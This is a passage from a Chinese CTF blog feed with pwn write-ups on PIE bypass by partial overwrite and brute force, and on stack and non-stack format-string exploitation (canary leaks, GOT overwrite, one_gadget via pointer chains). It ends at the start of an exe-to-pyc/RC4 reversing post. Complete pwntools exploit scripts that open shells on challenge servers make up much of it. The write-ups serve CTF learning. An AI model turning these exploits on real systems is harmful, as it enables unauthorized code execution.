class="string">f&#x27;[+][+][+]pie_base = <span class="subst">&#123;<span class="built_in">hex</span>(pie_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈溢出getflag</span></span><br><span class="line">getflag = pie_base + <span class="number">0x01231</span></span><br><span class="line">ret = pie_base + <span class="number">0x000000000000101a</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Anything else? &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x38</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret) + p64(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h6 id><a href="#" class="headerlink" title></a></h6><h3 id="2-linkctf-2018-7-babypie"><a href="#2-linkctf-2018-7-babypie" class="headerlink" title="2.linkctf_2018.7_babypie"></a>2.linkctf_2018.7_babypie</h3><p><a href="https://buuoj.cn/challenges#linkctf_2018.7_babypie">题目链接</a></p><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/pie2-1.bmp"></p><ul><li><strong>通过printf遇到\x00才会停止输出的特性，从而泄露canary</strong></li><li><font color="red">但是此时无法泄露出pie的基地址了，那么我们就无法修改ret_address了吗？其实不然</font></li></ul><p>之前说过，由于页对其的机制，即使开启了pie，其末三位16进制数字也是一样的，正是因为这个，**所以返回地址和后门函数的地址应该只有末四位不同(运气最差的情况下)**，所以我们只需要修改末四位就可以ret到后门函数，从而getshell。</p><ul><li>此题目就是如此，但是只需要修改末两位就可以getshell</li></ul><p><font size="4"><strong>gdb 调试，画框部分其实就是main函数结束后的返回地址，发现偏移是0xa6a</strong></font></p><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/pie2-2.bmp"></p><p><strong><font size="4">ida中system(“&#x2F;bin&#x2F;sh”)的地址偏移是0xa42，只有后两位不同，修改后两位即可</font></strong></p><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/pie2-3.bmp"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26786</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x25</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Name:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell = 0x00A3E</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;\x42&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>如果有多位不同，而我们又只能逐字节更改，有时就需要自己写脚本爆破了</p><h3 id="3-Basectf-week3-PIE-爆破返回地址"><a href="#3-Basectf-week3-PIE-爆破返回地址" class="headerlink" title="3.Basectf-week3-PIE(爆破返回地址)"></a>3.Basectf-week3-PIE(爆破返回地址)</h3><p><a href="https://www.basectf.fun/">题目链接</a></p><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/3-1.bmp"></p><ul><li>发现主函数就这些，什么都没有，所以我们要泄露libc，获得system函数,所需的gadget。</li><li>但是我们无法像基本的ret2libc一样ret到main函数，那么如何修改呢？看下面的调试：</li></ul><h4 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h4><h5 id="1-填满栈空间，查看ret-address"><a href="#1-填满栈空间，查看ret-address" class="headerlink" title="1.填满栈空间，查看ret_address"></a>1.填满栈空间，查看ret_address</h5><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/3-2.bmp"></p><ul><li>如图，返回地址是__libc_start_main+128，按照之前的方法来说，这里应该是一个pie+偏移的地址，我们修改末两字节就可以返回到main函数，然后通过泄露的地址计算出pie基地址，进行其他操作。</li><li>但是这里不是，但是难道就不行了吗？其实不然，__libc_start_main函数附近也有gadget可以使我们返回main函数，可以自己用telescope去慢慢找，但是也可以直接爆破。</li><li>其实你要知道，这题目肯定是修改末字节可以返回main函数的，不然就写不出来了。</li></ul><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为 process 或 remote</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;challenge.basectf.fun&quot;, 20961)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):  <span class="comment"># 0x00 到 0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Trying p8 value: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">    p = process(<span class="string">&quot;./pwn&quot;</span>)  <span class="comment"># 每次循环都需要重新创建进程</span></span><br><span class="line">    payload = cyclic(<span class="number">0x100</span> + <span class="number">8</span>) + p8(i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = p.recvuntil(<span class="string">&quot;you said &quot;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(p.recv())</span><br><span class="line">        <span class="keyword">if</span> response:</span><br><span class="line">            libc_start_main = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - i + <span class="number">0xc0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+][+] Correct p8 value: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+][+] libc_start_main: <span class="subst">&#123;<span class="built_in">hex</span>(libc_start_main)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="comment"># 后续的攻击逻辑</span></span><br><span class="line">            base = libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">            system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">            bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">            pop_rdi_ret = base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">            ret = base + <span class="number">0x0000000000029139</span></span><br><span class="line"></span><br><span class="line">            payload = cyclic(<span class="number">0x108</span>) + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 找到正确的值后退出循环</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p8 value <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span> failed.&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><ul><li>效果：在出现输出停止的时候就说明那个数字是有效的，因为此时你已经远程控制服务器了，等待着你输出指令。</li><li>0xc0对应的是__libc_start_main的地址。</li><li>题目中没有相应的gadget,但是libc.so文件里面也有gadget，通过libc_base+偏移也可以使用</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="栈上格式化字符串"><a href="#栈上格式化字符串" class="headerlink" title="栈上格式化字符串"></a>栈上格式化字符串</h1><h3 id="1-64位泄露libc地址"><a href="#1-64位泄露libc地址" class="headerlink" title="1.64位泄露libc地址"></a>1.64位泄露libc地址</h3><ul><li>开始前可以先参考我的博客：<a href="https://blog.csdn.net/zwb2603096342/article/details/140495295?spm=1001.2014.3001.5502">BUUCTF axb_2019_fmt32 &amp; fmt64_格式化字符串泄露libc-CSDN博客</a></li></ul><p><font size="4" color="red">题目 BaseCTF week3-format_string_level2</font></p><p><img src="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%A0%88%E4%B8%8A-x64.bmp" alt="栈上-x64"></p><ul><li>很明显的格式化字符串漏洞，没有后门函数，需要泄露libc。</li><li>偏移照惯例找就行了，这里就不展示了，<strong>偏移是6</strong>，需要注意64位和32利用格式化字符串漏洞实现任意地址读的区别：<strong>64位的地址多了许多0，所以导致不可以在payload前面填要读的地址</strong></li></ul><p><font size="4" color="red">举例：</font></p><p>payload &#x3D; p64(printf_got) + b’%6$s’ 这样写在输出的时候，读完printf_got就结束了，got表地址就只有三字节，后面全是<strong>补全的\x00,会导致printf输出截断</strong>，<strong>所以printf_got应该放在后面。</strong></p><p><font size="4" color="red">题解：</font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>,<span class="number">49786</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./fmt&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment"># 偏移6</span></span><br><span class="line">payload = <span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(read_got) <span class="comment">#前面补全8字节，防止\x00截断</span></span><br><span class="line">p.send(payload)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;read&#x27;,read_addr)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&quot;</span>)</span><br><span class="line">base = read_addr - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="2-泄露canary"><a href="#2-泄露canary" class="headerlink" title="2.泄露canary"></a>2.泄露canary</h3><p><font size="4" color="red">题目 NSSCTF 3rd ezstack:</font></p><p><img src="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240826120221017.bmp"></p><ul><li>可以发现很明显的格式化字符串漏洞，但是只可以利用一次，由于<strong>printf遇到\x00才会停止输出</strong>，利用这个特性，加上任意地址可读的漏洞利用，<strong>我们可以泄露出canary</strong>。</li><li>难点其实在于<font size="4" color="red">找偏移</font></li></ul><p><font size="4" color="red">以本题举个例子：</font></p><p>buf距离canary 0x38的位置，在栈上差距0x38&#x2F;8&#x3D;7个位置，再加上64位传入前六个参数位于寄存器中，所以偏移其实是<strong>7+6&#x3D;13</strong>，然后就可以开始得到canary，进行正常的ret2libc：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移6+7</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node8.anna.nssctf.cn&quot;,28183)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401303</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;canary challenge\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%13$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+]canary=&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_address &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">LibcSearcher 没搜到，上网站找的</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line"><span class="string">base = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="string">system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.31-0ubuntu9.10_amd64.so&quot;</span>)</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;canary challenge\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%13$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+]canary=&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) +p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="非栈上格式化字符串"><a href="#非栈上格式化字符串" class="headerlink" title="非栈上格式化字符串"></a>非栈上格式化字符串</h1><h4 id="引言："><a href="#引言：" class="headerlink" title="引言："></a>引言：</h4><ul><li>此处博客只进行题目讲解，具体知识点可以去下面链接查看：</li></ul><h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><ul><li><font size4>NSSCTF 3rd <strong>ezfmt</strong></font></li></ul><p>先来看看题目：</p><p><img src="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E9%A2%98%E7%9B%AEida.bmp"></p><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><ul><li>题目很明显，给你7次利用格式化字符串漏洞的机会，让你getshell，可是我们发现<strong>buf是在bss段上面的</strong>，不同于在栈上的利用，在栈上，我们通常是<strong>修改printf_got为system地址</strong>，然后通过传入&#x2F;bin&#x2F;sh,达到getshell的目的，可是此处，我们不可以。</li><li>为什么？因为非栈上的格式化字符串漏洞的利用需要我们自己去手动写payload，不像非栈上有fmtstr_payload这种工具帮我们修改，因此，我们手搓修改就要一直用到格式化字符串漏洞，那么这个printf就无法更改，那我们可以修改什么呢?</li><li><font size="4" color="red"><strong>修改__libc_start_main</strong></font></li><li><strong>__libc_start_main相当于函数的返回地址</strong>，当程序结束的时候会执行它，我们可以将它修改为onegadget，然后就可以getshell了，下面说说如何修改。</li></ul><h4 id="修改核心："><a href="#修改核心：" class="headerlink" title="修改核心："></a>修改核心：</h4><ul><li>非栈上的修改需要我们<fron size="4" color="red"><strong>间接写+无中生友</strong></fron></li></ul><p>我们要找到 <font color="red"><strong>地址a -&gt; 地址b -&gt; 目标地址</strong>，这样的格式。</font></p><p><strong>因为修改a其实是修改c</strong></p><p>举个例子：</p><p><font color="red"> 为了得到A -&gt; B -&gt; C    C不在栈上</font></p><p><font color="red"> 有一个D跟C的地址很像，或许就末两字节不相同</font></p><p><font color="red">借助A -&gt; B -&gt; D 且已知偏移的情况下</font></p><p><font color="red"> 修改A末两字节，就可以使得B-&gt;C。</font></p><h4 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h4><ul><li>先查看栈结构，找到 a-&gt;b-&gt;c的结构，锁定修改的目标：</li></ul><p><img src="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825183747991.bmp"></p><p>如图，为了修改__libc_start_main，我们选定的结构是下面画框部分，可以发现画框部分的地址，与libc_start_main前面的地址相差不大，我们就成功地找到了”朋友”</p><p><font color="red"> D - &gt; __libc_start_main</font></p><p><font color="red"> A -&gt; B -&gt; C ，修改C为D</font></p><p><font color="red"> A -&gt; B -&gt; D -&gt; __libc_start_main ,再修改B就可以达到修改libc_start_main了</font></p><ul><li>接下来对B而言，刚好也是一个a-&gt;b-&gt;c的结构，<font color="red"><strong>B-&gt;D-&gt;libc_start_main</strong>,如此我们修改B即修改第三个指针libc_start_main为onegadget即可getshell</font></li></ul><p><img src="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825184307134.bmp"></p><h4 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node8.anna.nssctf.cn&quot;,28175)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.31-0ubuntu9.10_amd64.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc基地址和一个stack地址</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%9$p%11$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main= <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] libc_start_main:&quot;</span>,<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_main)</span></span><br><span class="line">base = libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack = &quot;</span>, <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">stack1 = stack - <span class="number">240</span> <span class="comment"># stack1 -&gt; libc_start_main</span></span><br><span class="line">stack2 = stack - <span class="number">224</span> <span class="comment"># stack2 -&gt; stack</span></span><br><span class="line">one = base + <span class="number">0xe3b01</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack1 = &quot;</span>, <span class="built_in">hex</span>(stack1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack2 = &quot;</span>, <span class="built_in">hex</span>(stack2))</span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>) </span><br><span class="line">p.sendline(pay)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">stack1+=<span class="number">2</span></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">stack1+=<span class="number">2</span></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2+<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&gt;&gt;<span class="number">32</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack+<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>libc版本是泄露libc_start_main后上网站找的：<a href="https://libc.rip/">libc-database</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exe-&gt;pyc &amp;&amp; RC4</title>
      <link href="/2024/08/22/exe-pyc-RC4/"/>
      <url>/2024/08/22/exe-pyc-RC4/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><p>这篇文章主要介绍ctfre部分，从exe文件转化成pyc文件，顺便提一下rc4加密。</p><p>题目来自basectf,如果选手看到了请务必避开。</p><h1 id="转化"><a href="#转化" class="headerlink" title="转化"></a>转化</h1><h2 id="exe-pyc"><a href="#exe-pyc" class="headerlink" title="exe-&gt;pyc"></a>exe-&gt;pyc</h2><ul><li><p>首先明白为什么要从exe-&gt;pyc，见下图：</p><p><img src="/2024/08/22/exe-pyc-RC4/exe%E4%BE%8B%E5%AD%90.bmp" alt="exe例子"></p></li></ul><p>我们发现图片虽然是一个exe,但是程序图标是可以发现是一个.py文件，于是我们要去转化成pyc</p><p><strong>介绍一篇文章看看</strong>：<a href="https://blog.csdn.net/qq_35578171/article/details/138047494?app_version=6.4.5&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22138047494%22,%22source%22:%222302_79260400%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">csdn-blog</a></p><p>觉得麻烦提供一个在线网站：<a href="https://pyinstxtractor-web.netlify.app/">PyInstaller Extractor WEB (pyinstxtractor-web.netlify.app)</a></p><p>自己选择exe文件运行就行，会得到一个压缩包，里面会有pyc文件</p><p><img src="/2024/08/22/exe-pyc-RC4/exe-pyc.bmp"></p><h2 id="pyc-py代码："><a href="#pyc-py代码：" class="headerlink" title="pyc-&gt;py代码："></a>pyc-&gt;py代码：</h2><ul><li><p>先了解什么是pyc：我们所看到的pyc文件，其实是PyCodeObject，是Python编译后的结果。当python程序运行时，编译的结果是保存于PyCodeObject，程序运行结束后，Python就将PyCodeObject写入到pyc文件中，这是个字节码文件。[<a href="https://blog.csdn.net/weixin_42183408/article/details/88557812">引用</a>]</p></li><li><p>在线网站：<a href="https://www.lddgo.net/string/pyc-compile-decompile">在线Python pyc文件编译与反编译 (lddgo.net)</a></p></li></ul><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><ul><li><p>先前得到的pyc转化为py代码，我们可以发现如下的加密脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.9</span></span><br><span class="line"><span class="keyword">import</span> Key</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> 